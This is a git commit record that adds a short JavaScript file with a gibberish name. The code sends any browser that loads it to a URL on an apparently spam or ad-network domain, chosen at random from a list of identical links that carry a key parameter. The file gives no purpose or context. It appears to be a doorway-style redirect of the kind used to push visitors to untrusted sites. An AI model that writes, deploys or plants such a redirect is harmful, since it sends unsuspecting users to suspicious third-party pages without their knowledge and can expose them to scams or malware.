9e7da76312b5b4274ccc064dc5de4b2f55f1ec31
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-03-31 14:40:05 +0700

    Create akeadstemingguaan2.js

---
+++ akeadstemingguaan2.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+
+'https://coldnesshoneysnort.com/jhgcbwvgq1?key=e48f5e324a2ccbb711e419f9ce5e2b22',
+'https://coldnesshoneysnort.com/jhgcbwvgq1?key=e48f5e324a2ccbb711e419f9ce5e2b22',
+'https://coldnesshoneysnort.com/jhgcbwvgq1?key=e48f5e324a2ccbb711e419f9ce5e2b22'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
